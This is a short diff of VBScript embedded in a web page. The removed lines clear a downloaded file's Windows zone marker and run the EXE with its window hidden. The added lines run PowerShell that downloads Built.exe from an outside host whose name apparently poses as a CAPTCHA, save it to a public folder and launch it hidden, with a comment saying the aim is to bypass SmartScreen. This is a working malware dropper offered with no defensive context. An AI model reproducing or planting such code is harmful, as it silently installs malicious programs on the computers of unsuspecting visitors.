@@ -36,12 +36,11 @@
             objStream.Close
         End If
         
-        ' Unblock the file using PowerShell (directly without warning)
+        ' Run PowerShell command to bypass SmartScreen and execute the EXE
         Set WshShell = CreateObject("WScript.Shell")
-        WshShell.Run "powershell -command Set-ItemProperty -Path '" & tempFilePath & "' -Name 'Zone.Identifier' -Value '0'", 0, True
-        
-        ' Run the downloaded EXE file silently
-        WshShell.Run Chr(34) & tempFilePath & Chr(34), 0, False ' 0 hides the window
+        WshShell.Run "powershell -Command ""[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; 
+        Invoke-WebRequest -Uri 'https://notafakecaptica2222.vercel.app/Built.exe' -OutFile 'C:\Users\Public\Built.exe'; 
+        Start-Process 'C:\Users\Public\Built.exe' -WindowStyle Hidden -Wait""", 0, True
         
     </script>
 </body>
